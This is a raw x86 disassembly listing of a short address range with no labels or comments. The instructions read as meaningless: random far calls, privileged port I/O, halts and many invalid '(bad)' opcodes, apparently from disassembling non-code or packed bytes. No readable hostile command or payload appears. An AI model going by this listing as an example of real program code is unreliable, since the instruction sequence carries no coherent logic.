  43a0ce:	xchg   ebp,eax
  43a0cf:	jo     0x43a065
  43a0d1:	dec    ebp
  43a0d2:	call   0x85f5:0x1c076e5a
  43a0d9:	cmp    ah,BYTE PTR [bx+0x557a]
  43a0de:	aad    0x9e
  43a0e0:	inc    ebx
  43a0e1:	scas   al,BYTE PTR es:[edi]
  43a0e2:	dec    esp
  43a0e3:	loope  0x43a097
  43a0e5:	out    dx,eax
  43a0e6:	jnp    0x43a0e3
  43a0e8:	das    
  43a0e9:	cmp    BYTE PTR [esi-0x64],bl
  43a0ec:	fisttp QWORD PTR [edx]
  43a0ee:	shr    dl,1
  43a0f0:	not    edx
  43a0f2:	and    eax,0xfddba40f
  43a0f7:	lods   eax,DWORD PTR ds:[esi]
  43a0f8:	mov    bl,0x9b
  43a0fa:	push   edx
  43a0fb:	icebp  
  43a0fc:	inc    edi
  43a0fd:	and    eax,0x4dd251b0
  43a102:	sti    
  43a103:	fidivr WORD PTR [ebx+ecx*1+0x77]
  43a107:	fimul  WORD PTR [ebx+0x53]
  43a10a:	sub    eax,0x6ebabfe6
  43a10f:	clc    
  43a110:	dec    edx
  43a111:	imul   ebx,DWORD PTR [edx+0x26d2a3d7],0x3b
  43a118:	pushf  
  43a119:	fstp   QWORD PTR [ebx+0x80b21d6]
  43a11f:	pop    ecx
  43a120:	fisttp WORD PTR [ebp-0x1db72c29]
  43a126:	call   0xd205:0x3760db91
  43a12d:	pop    edx
  43a12e:	pop    ebp
  43a12f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43a130:	push   0x3
  43a132:	cmc    
  43a133:	adc    BYTE PTR [edx+esi*1+0x1],dh
  43a137:	inc    ebx
  43a138:	mov    edi,0xe55d9d82
  43a13d:	inc    ebp
  43a13e:	mov    bh,0x12
  43a140:	push   ebp
  43a141:	mov    ebp,0x31a0fa1a
  43a146:	jge    0x43a0ef
  43a148:	cmp    al,0xae
  43a14a:	mov    ds:0xd3a409a,eax
  43a14f:	std    
  43a150:	mov    dl,0x92
  43a152:	xor    esp,DWORD PTR ds:0xa26eba60
  43a158:	jo     0x43a15e
  43a15a:	pop    ebp
  43a15b:	mov    DWORD PTR [esi+0x39],esi
  43a15e:	fisubr DWORD PTR [eax-0x71]
  43a161:	repz mov fs,WORD PTR [esi-0x38]
  43a165:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43a166:	call   0x4515:0xa55b0890
  43a16d:	inc    edi
  43a16e:	push   0x148b88a7
  43a173:	pop    ss
  43a174:	call   0x5d81:0xafd48c69
  43a17b:	bound  ebp,QWORD PTR [edx-0x3b]
  43a17e:	push   es
  43a17f:	mov    DWORD PTR ds:0x6dc6a209,ebx
  43a185:	jg     0x43a136
  43a187:	push   edi
  43a188:	sar    DWORD PTR ds:0x9c0a940a,1
  43a18e:	jmp    0x9b0fee57
  43a193:	sub    cl,BYTE PTR ds:0x925a7267
  43a199:	clc    
  43a19a:	and    DWORD PTR [edi-0x2047a191],0xffffff8a
  43a1a1:	sbb    al,BYTE PTR [edi]
  43a1a3:	(bad)  
  43a1a4:	mov    ah,0x9e
  43a1a6:	push   ss
  43a1a7:	jge    0x43a204
  43a1a9:	imul   esp,DWORD PTR [edx-0x48],0x6721ba23
  43a1b0:	sbb    ecx,DWORD PTR [ecx-0x3f]
  43a1b3:	inc    esi
  43a1b4:	jo     0x43a1c4
  43a1b6:	mov    esp,0x84808fa9
  43a1bb:	adc    dh,BYTE PTR ds:0x12c88f87
  43a1c1:	popf   
  43a1c2:	dec    esp
  43a1c3:	pop    ecx
  43a1c4:	or     eax,0xd863e10b
  43a1c9:	inc    ebp
  43a1ca:	adc    esp,DWORD PTR [ecx]
  43a1cc:	jle    0x43a207
  43a1ce:	call   0x5792:0x2cac55fb
  43a1d5:	pusha  
  43a1d6:	mov    ch,0xa9
  43a1d8:	sahf   
  43a1d9:	cwde   
  43a1da:	push   ecx
  43a1db:	ss push ebp
  43a1dd:	fwait
  43a1de:	and    al,0x8c
  43a1e0:	xor    DWORD PTR [esp+ecx*8+0x68],ebp
  43a1e4:	inc    edx
  43a1e5:	push   esi
  43a1e6:	or     BYTE PTR [ebp-0x63658ab4],bl
  43a1ec:	jg     0x43a25d
  43a1ee:	inc    esp
  43a1ef:	rcr    DWORD PTR [edx+0x50],cl
  43a1f2:	cmp    eax,DWORD PTR [ebp-0x39]
  43a1f5:	or     BYTE PTR [ecx+0x2a0f0a2a],ch
  43a1fb:	sbb    DWORD PTR [edx-0x34],edi
  43a1fe:	sbb    dh,BYTE PTR [edx+esi*4]
  43a201:	fsubr  QWORD PTR ds:0x2bd4ba67
  43a207:	mov    ch,0xde
  43a209:	jge    0x43a1bf
  43a20b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a20c:	jns    0x43a285
  43a20e:	bound  edi,QWORD PTR [eax]
  43a210:	push   ecx
  43a211:	fsub   DWORD PTR [eax-0x5c]
  43a214:	mov    dl,0x3f
  43a216:	(bad)
  43a21a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a21b:	push   cs
  43a21c:	js     0x43a229
  43a21e:	mov    ah,0xd0
  43a220:	jmp    0x470866f3
  43a225:	std    
  43a226:	call   0x5236:0x48cac746
  43a22d:	imul   ecx,DWORD PTR [ecx+0x3899cfa7],0xb714f46c
  43a237:	jl     0x43a1e7
  43a239:	mov    bl,0x45
  43a23b:	mov    eax,ds:0xd87019b1
  43a240:	ja     0x43a235
  43a242:	pop    eax
  43a243:	push   ds
  43a244:	ins    BYTE PTR es:[edi],dx
  43a245:	or     ebp,DWORD PTR [esp+ebx*8+0x768a8c4a]
  43a24c:	adc    eax,DWORD PTR [edx+ebx*4+0x5493884b]
  43a253:	dec    edx
  43a254:	in     eax,dx
  43a255:	(bad)  
  43a256:	frstor [edi+0x61b4f247]
  43a25c:	shl    BYTE PTR [edx],1
  43a25e:	push   ecx
  43a25f:	sahf   
  43a260:	mov    dl,0x0
  43a262:	xchg   ebx,eax
  43a263:	test   al,0xa9
  43a265:	push   edx
  43a266:	mov    al,0x63
  43a268:	inc    ebx
  43a269:	or     ecx,edx
  43a26b:	dec    esp
  43a26c:	ja     0x43a26a
  43a26e:	loope  0x43a28d
  43a270:	cld    
  43a271:	sub    eax,0xb5d29b9a
  43a276:	stc    
  43a277:	sub    al,0x99
  43a279:	or     DWORD PTR [edi+0x3ebffba7],ebx
  43a27f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43a280:	(bad)  
  43a281:	ins    DWORD PTR es:[edi],dx
  43a282:	adc    eax,0x43596a9
  43a287:	(bad)  
  43a288:	lods   eax,DWORD PTR ds:[esi]
  43a289:	fstp   DWORD PTR [edx-0x15c66e32]
  43a28f:	mov    bl,0xe1
  43a291:	ss sbb eax,0xa90f2c14
  43a297:	addr16 nop
  43a299:	jmp    0xd49b:0x7c1b0908
  43a2a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a2a1:	lea    ecx,[edx-0x3a]
  43a2a4:	ret    0xea2f
  43a2a7:	stos   DWORD PTR es:[edi],eax
  43a2a8:	scas   eax,DWORD PTR es:[edi]
  43a2a9:	or     al,0xd6
  43a2ab:	clc    
  43a2ac:	pop    ds
  43a2ad:	pop    DWORD PTR [edx+0x15897219]
  43a2b3:	out    dx,eax
  43a2b4:	push   ss
  43a2b5:	mov    dl,0x87
  43a2b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43a2b8:	sar    ebx,0xda
  43a2bb:	sbb    bl,BYTE PTR gs:[ebp*2-0xaf4c133]
  43a2c3:	(bad)  
  43a2c5:	sub    ch,BYTE PTR [ebx]
  43a2c7:	and    BYTE PTR [edx+0x28],ah
  43a2ca:	jle    0x43a309
  43a2cc:	mov    dl,0xe1
  43a2ce:	shl    BYTE PTR ds:0xc01ac6b,cl
  43a2d4:	xchg   BYTE PTR [ebx],cl
  43a2d6:	jmp    0x7bb4:0xde16955d
  43a2dd:	and    eax,0x23b7f49a
  43a2e2:	test   al,0xb8
  43a2e4:	fisubr DWORD PTR ds:0xf60da705
  43a2ea:	xor    ch,BYTE PTR [esi-0x35c36406]
  43a2f0:	mov    esp,0xed6c970f
  43a2f5:	stos   DWORD PTR es:[edi],eax
  43a2f6:	pop    ds
  43a2f7:	not    ch
  43a2f9:	mov    esi,0x9cb3a7c0
  43a2fe:	xor    edi,edi
  43a300:	inc    esp
  43a301:	js     0x43a290
  43a303:	add    BYTE PTR [ebx+0x1027f343],cl
  43a309:	adc    eax,0x38904517
  43a30e:	cdq    
  43a30f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a310:	in     al,0x8b
  43a312:	out    dx,al
  43a313:	adc    eax,0xe9cf2d24
  43a318:	mov    esp,0xaa3216ee
  43a31d:	sub    ebp,DWORD PTR [eax+0x76]
  43a320:	test   eax,0x7fa7dd1b
  43a325:	pop    es
  43a326:	add    eax,0x1df81c70
  43a32b:	push   esi
  43a32c:	mov    DWORD PTR [ebp+0x350c9f00],eax
  43a332:	scas   al,BYTE PTR es:[edi]
  43a333:	daa    
  43a334:	xor    ah,BYTE PTR [esi]
  43a336:	push   edi
  43a337:	clc    
  43a338:	leave  
  43a339:	test   al,0x48
  43a33b:	fcom   DWORD PTR [edi+0x36]
  43a33e:	cld    
  43a33f:	sub    ax,0xb04d
  43a343:	and    al,0x90
  43a345:	or     eax,0x705ae80c
  43a34a:	jle    0x43a368
  43a34c:	ret    
  43a34d:	sbb    bl,BYTE PTR [edx-0x9edf422]
  43a353:	jbe    0x43a388
  43a355:	inc    eax
  43a356:	or     dh,BYTE PTR [eax+esi*8-0x365ba840]
  43a35d:	mov    eax,ds:0x4db24113
  43a362:	stos   DWORD PTR es:[edi],eax
  43a363:	sub    BYTE PTR [edx+0x2a],dh
  43a366:	mov    ebx,DWORD PTR ds:0x8c8f5301
  43a36c:	mov    dl,0xe9
  43a36e:	sbb    bl,BYTE PTR [ebp+0x3e]
  43a371:	xchg   ebp,eax
  43a372:	int    0xeb
  43a374:	mov    dl,0x81
  43a376:	sub    BYTE PTR [eax-0x7e],ah
  43a379:	iret   
  43a37a:	push   esp
  43a37b:	sbb    ch,BYTE PTR [ecx+esi*2+0x7f62a707]
  43a382:	mov    bh,0xe5
  43a384:	outs   dx,BYTE PTR ds:[esi]
  43a385:	inc    edx
  43a386:	sbb    al,0xfd
  43a388:	pop    eax
  43a389:	inc    esi
  43a38a:	fwait
  43a38b:	xchg   edx,eax
  43a38c:	in     eax,0xc5
  43a38e:	outs   dx,DWORD PTR ds:[esi]
  43a38f:	aaa    
  43a390:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43a391:	pop    ecx
  43a392:	push   esi
  43a393:	or     dl,dh
  43a395:	or     ebx,DWORD PTR [eax-0x473cba49]
  43a39b:	fcom   QWORD PTR [edi+ebx*8+0xac712a5]
  43a3a2:	push   esp
  43a3a3:	sbb    al,0xc
  43a3a5:	out    0x31,eax
  43a3a7:	jg     0x43a3db
  43a3a9:	add    DWORD PTR [edi-0x4516319b],ebp
  43a3af:	div    BYTE PTR [ebx-0x6f9da33d]
  43a3b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43a3b6:	cmp    ecx,DWORD PTR [ebp+0x633f7532]
  43a3bc:	gs jmp 0x97d9:0xbeb23b0b
  43a3c4:	out    0x64,al
  43a3c6:	lds    ecx,FWORD PTR [esi*2+0x258dd76b]
  43a3cd:	div    BYTE PTR [ecx+0x7d]
  43a3d0:	mov    ebp,0xad860bd
  43a3d5:	dec    ebx
  43a3d6:	aam    0xfd
  43a3d8:	push   ss
  43a3d9:	and    edi,DWORD PTR [ecx]
  43a3db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a3dc:	shl    BYTE PTR [edi],0x9e
  43a3df:	sahf   
  43a3e0:	fsubr  DWORD PTR [eax]
  43a3e2:	test   DWORD PTR [esi+edi*8-0x1659a8dc],edi
  43a3e9:	sbb    eax,0x89aa531e
  43a3ee:	jbe    0x43a3b2
  43a3f0:	or     DWORD PTR [ebx],0xffffffb8
  43a3f3:	ret    
  43a3f4:	scas   al,BYTE PTR es:[edi]
  43a3f5:	sti    
  43a3f6:	gs ja  0x43a448
  43a3f9:	mov    ecx,0xccb2f06e
  43a3fe:	or     al,0xed
  43a400:	call   0x7a1be266
  43a405:	jns    0x43a3c8
  43a407:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a408:	or     BYTE PTR [esi-0x6d36a872],dh
  43a40e:	repz push ss
  43a410:	mov    cl,0xd7
  43a412:	jmp    0x43a44d
  43a414:	lock hlt 
  43a416:	(bad)  
  43a417:	jg     0x43a45a
  43a419:	pop    es
  43a41a:	repnz push ebp
  43a41c:	or     DWORD PTR [edx],ecx
  43a41e:	shl    ebp,cl
  43a420:	add    dh,dh
  43a422:	inc    ebp
  43a423:	sahf   
  43a424:	or     cl,bh
  43a426:	pop    edx
  43a427:	imul   esi,DWORD PTR [edx-0x284c0fc3],0x3045cc1
  43a431:	or     edi,DWORD PTR [edx+0x69f7235f]
  43a437:	frstor [edx-0x3e]
  43a43a:	mov    al,ds:0xc00bdcf2
  43a43f:	mov    dh,0x7f
  43a441:	in     al,0xec
  43a443:	cmp    BYTE PTR [ebx-0x4a116f5],0x7
  43a44a:	mov    esp,0x8474377b
  43a44f:	loope  0x43a470
  43a451:	push   esi
  43a452:	pop    esi
  43a453:	fst    st(7)
  43a455:	xor    DWORD PTR [edx+0x38],ebx
  43a458:	repnz mov ecx,0x2704a77a
  43a45e:	mov    eax,ds:0xddf3192a
  43a463:	retf   
  43a464:	scas   al,BYTE PTR es:[edi]
  43a465:	adc    BYTE PTR [edx],al
  43a467:	push   edi
  43a468:	mov    dl,0x64
  43a46a:	add    BYTE PTR [ebp-0x588a168c],ah
  43a470:	mov    ebp,0x3424baf9
  43a475:	jno    0x43a3fd
  43a477:	xlat   BYTE PTR ds:[ebx]
  43a478:	(bad)
  43a47c:	xchg   DWORD PTR [esi+0x4c5c9f29],ecx
  43a482:	fs sahf 
  43a484:	fld    DWORD PTR [ecx]
  43a486:	push   ds
  43a487:	fistp  QWORD PTR [esi]
  43a489:	mov    eax,ds:0x8b30269e
  43a48e:	fisub  WORD PTR [ebp+0x32]
  43a491:	test   DWORD PTR [esi+edx*2+0x52],ecx
  43a495:	aad    0xe4
  43a497:	cdq    
  43a498:	mov    dl,0xdc
  43a49a:	lods   al,BYTE PTR ds:[esi]
  43a49b:	push   ecx
  43a49c:	mov    esp,0x9a8b8e84
  43a4a1:	or     ebx,DWORD PTR [eax]
  43a4a3:	in     al,0x6b
  43a4a5:	mov    ebp,0x42ae6df4
  43a4aa:	xchg   esp,eax
  43a4ab:	or     DWORD PTR [esi-0x63],ebx
  43a4ae:	or     eax,esi
  43a4b0:	clc    
  43a4b1:	clc    
  43a4b2:	mov    esp,0xb4fc5682
  43a4b7:	lods   al,BYTE PTR ds:[esi]
  43a4b8:	in     eax,dx
  43a4b9:	fcomi  st,st(6)
  43a4bb:	aaa    
  43a4bc:	mov    dl,0xf
  43a4be:	jge    0x43a513
  43a4c0:	fnsave [edi-0x59]
  43a4c3:	lds    ebx,FWORD PTR [ebx-0x75]
  43a4c6:	cs stc 
  43a4c8:	jno    0x43a542
  43a4ca:	mov    ch,0x74
  43a4cc:	cmp    BYTE PTR [ebx],dh
  43a4ce:	adc    DWORD PTR ds:0xb49f5a32,eax
  43a4d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a4d5:	test   DWORD PTR [ebx],eax
  43a4d7:	cmp    eax,0x4fbe26b2
  43a4dc:	pushf  
  43a4dd:	adc    BYTE PTR [esi],bl
  43a4df:	mov    edx,DWORD PTR [ebp+0x6d4ae20b]
  43a4e5:	and    edx,edi
  43a4e7:	out    0xad,eax
  43a4e9:	dec    edx
  43a4ea:	popf   
  43a4eb:	push   esi
  43a4ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43a4ed:	mov    edx,DWORD PTR [esi-0x1]
  43a4f0:	sub    BYTE PTR ds:0xb870ce6,0x1
  43a4f7:	jle    0x43a54d
  43a4f9:	push   edi
  43a4fa:	sub    DWORD PTR [ebx+0x6e9a96fa],ecx
  43a500:	xor    eax,0x60d97ff6
  43a505:	push   esp
  43a506:	adc    al,0xef
  43a508:	cmp    DWORD PTR [ecx+0x619d719a],esi
  43a50e:	sbb    ebp,DWORD PTR [edx-0x3b]
  43a511:	hlt    
  43a512:	call   0xaff4:0x705a551f
  43a519:	test   eax,0x9521a680
  43a51e:	push   ebp
  43a51f:	stos   DWORD PTR es:[edi],eax
  43a520:	mov    esp,0x81673b9a
  43a525:	pop    ebx
  43a526:	call   0x5ed4:0x5dececfc
  43a52d:	cli    
  43a52e:	pusha  
  43a52f:	mov    DWORD PTR [ebp-0x30],edi
  43a532:	xchg   edi,eax
  43a533:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a534:	leave  
  43a535:	xchg   ecx,eax
  43a536:	test   eax,0x9ae5745e
  43a53b:	scas   al,BYTE PTR es:[edi]
  43a53c:	popf   
  43a53d:	mov    ebx,0x4d5db046
  43a542:	mov    edx,0xec6dfda7
  43a547:	mov    eax,ebp
  43a549:	cs mov eax,0x1adcb27f
  43a54f:	mov    DWORD PTR [ebx+0x73],0xb404f6a
  43a556:	mov    ebp,0xc614a8eb
  43a55b:	xchg   edi,eax
  43a55c:	adc    ch,dl
  43a55e:	call   0x2c5d:0x42695f03
  43a565:	push   cs
  43a566:	fadd   st,st(7)
  43a568:	aaa    
  43a569:	xlat   BYTE PTR ds:[ebx]
  43a56a:	retf   
  43a56b:	cdq    
  43a56c:	ins    BYTE PTR es:[edi],dx
  43a56d:	lock cwde 
  43a56f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43a570:	and    cl,bh
  43a572:	mov    esp,0x7a742ae4
  43a577:	loope  0x43a547
  43a579:	xchg   DWORD PTR [ebp+ebx*2+0x277fae85],edx
  43a580:	cmp    ebx,DWORD PTR [ecx+esi*2]
  43a583:	outs   dx,BYTE PTR ds:[esi]
  43a584:	push   es
  43a585:	push   ss
  43a586:	inc    edx
  43a587:	pusha  
  43a588:	xchg   ecx,eax
  43a589:	enter  0xcb11,0x69
  43a58d:	ins    BYTE PTR es:[edi],dx
  43a58e:	cmp    al,dh
  43a590:	mov    eax,ds:0x8b9b99c1
  43a595:	cmp    bh,BYTE PTR ds:0x1cfb8604
  43a59b:	jge    0x43a5a0
  43a59d:	or     ebp,DWORD PTR [edi]
  43a59f:	and    ebx,DWORD PTR [eax-0x65]
  43a5a2:	mov    eax,ds:0x7eb92003
  43a5a7:	push   eax
  43a5a8:	mov    cl,0xe5
  43a5aa:	fs out dx,al
  43a5ac:	cmp    BYTE PTR [ecx-0x104be807],ch
  43a5b2:	fcomp  QWORD PTR [ebx-0x63958f86]
  43a5b8:	push   es
  43a5b9:	das    
  43a5ba:	add    al,0x1b
  43a5bc:	or     cl,BYTE PTR [edx-0x24919275]
  43a5c2:	repnz arpl WORD PTR [ebp-0x76d4653d],bx
  43a5c9:	imul   esi,DWORD PTR [edx],0xffffff8c
  43a5cc:	(bad)  
  43a5cd:	cmp    al,cl
  43a5cf:	rol    BYTE PTR [esi+0xb],cl
  43a5d2:	sbb    DWORD PTR [edi-0x45a4439f],0xa9a1fd5
  43a5dc:	test   al,0xbe
  43a5de:	repz sbb dh,BYTE PTR [edx]
  43a5e1:	test   al,0xd5
  43a5e3:	mov    esp,0xd3c35923
  43a5e8:	add    ch,al
  43a5ea:	and    DWORD PTR ds:0x80ac88b5,edi
  43a5f0:	pop    esi
  43a5f1:	(bad)  
  43a5f2:	push   0x37
  43a5f4:	outs   dx,BYTE PTR ds:[esi]
  43a5f5:	sti    
  43a5f6:	adc    DWORD PTR [edi-0xc14bd6c],esp
  43a5fc:	imul   ebp,esi,0xffffffe7
  43a5ff:	jbe    0x43a5b3
  43a601:	scas   al,BYTE PTR es:[edi]
  43a602:	loopne 0x43a662
  43a604:	sbb    eax,0x802ef373
  43a609:	or     esi,DWORD PTR [edi-0x17]
  43a60c:	cmp    BYTE PTR [esi+0x5c],ch
  43a60f:	push   edx
  43a610:	mov    ax,0x539a
  43a614:	push   esp
  43a615:	jb     0x43a636
  43a617:	or     eax,ecx
  43a619:	inc    edx
  43a61a:	lahf   
  43a61b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a61c:	jne    0x43a64a
  43a61e:	mov    bl,0x86
  43a620:	scas   al,BYTE PTR es:[edi]
  43a621:	jmp    0xbdf4025f
  43a626:	push   ss
  43a627:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43a628:	xor    al,0x5f
  43a62a:	inc    eax
  43a62b:	(bad)  
  43a62c:	shr    BYTE PTR [esi],1
  43a62e:	(bad)  [edi-0x306c7022]
  43a634:	push   esp
  43a635:	or     dh,BYTE PTR ds:0x9d2cb270
  43a63b:	pop    es
  43a63c:	dec    ecx
  43a63d:	push   ebx
  43a63e:	cmc    
  43a63f:	mov    ch,0x9a
  43a641:	or     al,0x37
  43a643:	stos   DWORD PTR es:[edi],eax
  43a644:	out    0x4,al
  43a646:	cs nop
  43a648:	inc    ebx
  43a649:	jnp    0x43a6bc
  43a64b:	xchg   esi,eax
  43a64c:	pop    ebp
  43a64d:	xchg   edx,eax
  43a64e:	jl     0x43a66c
  43a650:	mov    eax,0x97012af0
  43a655:	mov    ebx,0x64b6e59a
  43a65a:	dec    eax
  43a65b:	in     eax,dx
  43a65c:	or     eax,0xac70fd0b
  43a661:	inc    edi
  43a662:	gs aad 0x89
  43a665:	repz xchg esp,eax
  43a667:	sub    eax,DWORD PTR [edx+0x23]
  43a66a:	rol    dh,cl
  43a66c:	rcr    DWORD PTR [esi+eiz*1+0x6678d227],1
  43a673:	scas   al,BYTE PTR es:[edi]
  43a674:	gs loope 0x43a652
  43a677:	lods   al,BYTE PTR ds:[esi]
  43a678:	xor    ebx,esi
  43a67a:	adc    ch,BYTE PTR [edi-0x6d]
  43a67d:	(bad)  
  43a67f:	xchg   ebx,eax
  43a680:	mov    dl,0x20
  43a682:	or     BYTE PTR [esi-0x7b],al
  43a685:	addr16 push ebx
  43a687:	jle    0x43a6b6
  43a689:	push   ebx
  43a68a:	je     0x43a685
  43a68c:	lods   al,BYTE PTR ds:[esi]
  43a68d:	(bad)  
  43a68e:	(bad)  
  43a68f:	es aaa 
  43a691:	daa    
  43a692:	imul   esi,eax,0xf2abd3b6
  43a698:	ret    0x9ad1
  43a69b:	pop    ss
  43a69c:	lock ins BYTE PTR es:[edi],dx
  43a69e:	test   eax,0xba2d9b44
  43a6a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a6a4:	jne    0x43a673
  43a6a6:	int    0xa8
  43a6a8:	xchg   ebp,eax
  43a6a9:	xlat   BYTE PTR ds:[ebx]
  43a6aa:	jno    0x43a722
  43a6ac:	mov    dl,0xe
  43a6ae:	mov    gs,ebp
  43a6b0:	jns    0x43a6f6
  43a6b2:	sti    
  43a6b3:	mov    edx,0x42e90b8f
  43a6b8:	or     eax,0x99b2c819
  43a6bd:	fcomp  QWORD PTR [edx+0x712682e0]
  43a6c3:	mov    ebp,0xa70a658a
  43a6c8:	scas   eax,DWORD PTR es:[edi]
  43a6c9:	sbb    BYTE PTR ds:0x84ad8e85,cl
  43a6cf:	jp     0x43a687
  43a6d1:	(bad)  
  43a6d2:	cwde   
  43a6d3:	xchg   esp,eax
  43a6d4:	retf   0x1a4c
  43a6d7:	jecxz  0x43a6b1
  43a6d9:	or     BYTE PTR [ecx],cl
  43a6db:	mov    al,ds:0x3772f574
  43a6e0:	mov    ch,0x3b
  43a6e2:	fwait
  43a6e3:	push   ss
  43a6e4:	jae    0x43a739
  43a6e6:	call   0x6413:0xa467c48f
  43a6ed:	mov    dl,BYTE PTR [ebp-0x59]
  43a6f0:	outs   dx,DWORD PTR ds:[esi]
  43a6f1:	add    al,0xf1
  43a6f3:	out    0xb0,al
  43a6f5:	mov    ebp,eax
  43a6f7:	iret   
  43a6f8:	mov    dl,0xb1
  43a6fa:	push   ds
  43a6fb:	add    al,0x96
  43a6fd:	outs   dx,BYTE PTR ds:[esi]
  43a6fe:	dec    eax
  43a6ff:	add    BYTE PTR [ecx-0x146198f5],0xad
  43a706:	pop    ecx
  43a707:	push   ss
  43a708:	cdq    
  43a709:	jmp    0x8799:0x8bb447a5
  43a710:	fdiv   QWORD PTR [edi]
  43a712:	imul   DWORD PTR [edi+0x0]
  43a715:	or     ebp,DWORD PTR [edx]
  43a717:	push   es
  43a718:	stos   BYTE PTR es:[edi],al
  43a719:	push   eax
  43a71a:	xchg   esi,eax
  43a71b:	out    dx,al
  43a71c:	or     al,BYTE PTR [esi-0x66]
  43a71f:	lock jae 0x43a78e
  43a722:	cmp    eax,0x6dd1addc
  43a727:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a728:	inc    esi
  43a729:	(bad)  
  43a72a:	xchg   ebp,eax
  43a72b:	xchg   esp,eax
  43a72c:	clc    
  43a72d:	add    edi,0xd
  43a730:	mov    dl,0xd8
  43a732:	xchg   edi,eax
  43a733:	cmp    eax,0x51704e52
  43a738:	mov    dh,0xb
  43a73a:	cld    
  43a73b:	push   eax
  43a73c:	xor    al,0x9c
  43a73e:	add    eax,0x9ac31f8a
  43a743:	dec    eax
  43a744:	push   ds
  43a745:	aas    
  43a746:	or     ch,BYTE PTR [edi]
  43a748:	mov    ecx,cs
  43a74a:	mov    eax,ds:0x760b7b55
  43a74f:	data16 jge 0x43a709
  43a752:	repz enter 0x7761,0xa1
  43a757:	jg     0x43a74f
  43a759:	mov    edx,ebp
  43a75b:	popf   
  43a75c:	push   0xdfec431d
  43a761:	or     edi,DWORD PTR [edx]
  43a763:	out    0xd0,al
  43a765:	in     al,0x9
  43a767:	jmp    0x95ddca66
  43a76c:	jmp    0x43a761
  43a76e:	stos   DWORD PTR es:[edi],eax
  43a76f:	popf   
  43a770:	sbb    eax,0xafa7e59e
  43a775:	daa    
  43a776:	mov    ecx,0xd5592021
  43a77b:	pop    ss
  43a77c:	mov    bl,0x79
  43a77e:	cwde   
  43a77f:	mov    ch,0xa9
  43a781:	test   DWORD PTR [edi+0x20d67af4],edi
  43a787:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a788:	inc    edi
  43a789:	shl    BYTE PTR [ecx-0x2385fb56],0x3d
  43a790:	mov    dl,0x73
  43a792:	rcr    al,cl
  43a794:	and    BYTE PTR [edx],dl
  43a796:	dec    esi
  43a797:	lock lods eax,DWORD PTR ds:[esi]
  43a799:	or     ebx,edx
  43a79b:	outs   dx,BYTE PTR ds:[esi]
  43a79c:	fwait
  43a79d:	call   0x83fa8378
  43a7a2:	call   0xd1d5:0x6658793b
  43a7a9:	jo     0x43a76c
  43a7ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a7ac:	int    0x1d
  43a7ae:	adc    eax,0x7e39e037
  43a7b3:	imul   esi,DWORD PTR [edx+0x5569948c],0xffffff9e
  43a7ba:	inc    edx
  43a7bb:	cmp    DWORD PTR [ecx],edx
  43a7bd:	or     edx,DWORD PTR [ebp-0x54]
  43a7c0:	adc    al,0x99
  43a7c2:	mov    ds:0x9d76f56a,al
  43a7c7:	mov    bl,0x81
  43a7c9:	fisttp QWORD PTR [edx]
  43a7cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43a7cc:	mov    edi,DWORD PTR gs:[ebx]
  43a7cf:	and    BYTE PTR [edx-0x10195585],ch
  43a7d5:	add    eax,0xa662db91
  43a7da:	cli    
  43a7db:	inc    eax
  43a7dc:	jns    0x43a823
  43a7de:	test   al,0xdf
  43a7e0:	mov    cl,0x29
  43a7e2:	cli    
  43a7e3:	or     eax,edi
  43a7e5:	sbb    edi,DWORD PTR [eax+0x54]
  43a7e8:	mov    edi,0x24b6c29b
  43a7ed:	or     eax,DWORD PTR [edi+edi*4]
  43a7f0:	and    bl,dh
  43a7f2:	and    BYTE PTR [ebp+0x7a],bl
  43a7f5:	push   edx
  43a7f6:	call   0x9dd6:0x2f2592c5
  43a7fd:	lods   al,BYTE PTR ds:[esi]
  43a7fe:	and    ebx,ebx
  43a800:	int3   
  43a801:	xor    bh,BYTE PTR [esi-0x41]
  43a804:	mov    cl,0xe2
  43a806:	out    0x11,eax
  43a808:	push   0xe4c17a6f
  43a80d:	and    eax,0xc6facb99
  43a812:	ss add al,0x2a
  43a815:	fist   DWORD PTR [ecx+0x2a]
  43a818:	pop    esp
  43a819:	or     BYTE PTR [edi-0x4b],bh
  43a81c:	test   DWORD PTR cs:[ebx],ebx
  43a81f:	scas   eax,DWORD PTR es:[edi]
  43a820:	jb     0x43a7e5
  43a822:	jmp    0x4dbb56a9
  43a827:	lds    ebp,FWORD PTR [ebp-0x4b9125e8]
  43a82d:	jne    0x43a7b2
  43a82f:	int3   
  43a830:	sbb    ecx,DWORD PTR [ebx]
  43a832:	and    edx,DWORD PTR [ebp+0x7d027c54]
  43a838:	jle    0x43a891
  43a83a:	xchg   DWORD PTR [ebx+ebp*2-0x7d],ecx
  43a83e:	call   0xdc46:0xc4b0b072
  43a845:	or     ecx,DWORD PTR [ebp+0x44]
  43a848:	jns    0x43a84a
  43a84a:	inc    edx
  43a84b:	adc    BYTE PTR [edx+0x5e739aa3],ch
  43a851:	mov    eax,0x60eff7d3
  43a856:	inc    ebp
  43a857:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43a858:	pop    ecx
  43a859:	sub    DWORD PTR [edi],esi
  43a85b:	xchg   ecx,eax
